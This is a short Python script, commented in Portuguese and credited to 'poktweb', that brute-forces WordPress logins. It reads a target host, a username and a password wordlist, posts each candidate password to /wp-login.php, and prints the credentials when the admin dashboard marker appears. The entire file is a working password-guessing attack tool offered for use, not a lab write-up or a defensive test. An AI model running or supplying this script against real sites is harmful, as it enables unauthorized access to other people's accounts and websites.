import requests
import sys

#Gosto de deixar os codigos bem comentados

print("''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''")
print("''   Feito por: poktweb                                             ''")
print("''   Uso: wp-brut.py host + usuario + caminho da lista de senhas    ''")
print("''   guithub: https://github.com/poktweb/                           ''")
print("''   V: 1.0                                                         ''")
print("''   Testado na versão: 5.7.2 do wordpress                          ''")
print("''                                                                  ''")
print("'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' \n")


argv = sys.argv #argv1 host, argv2 usuario, argv3 senha

url = str(argv[1]) #Url

login_url = url+"/wp-login.php" #Path login

arquivo = str(argv[3]) #Lista de senhas

usuario = str(argv[2]) #usuario

wordlist = open(arquivo, "r") #Abre a lista de senhas

print("Testando... \n")

for i in wordlist: #Dentro de wordlist procure por i que é a senha
    ck = {'log': usuario, 'pwd': i} #Data passando usuario e senha
    r = requests.post(login_url, data= ck) #Faz a requisição para o site e ja leva o usuario e senha
    if "welcome-panel" in r.text: #Checa se deu certo ou não
        print("Found :", "Usuario", usuario, "||", "Senha", i)
        print("=========================================")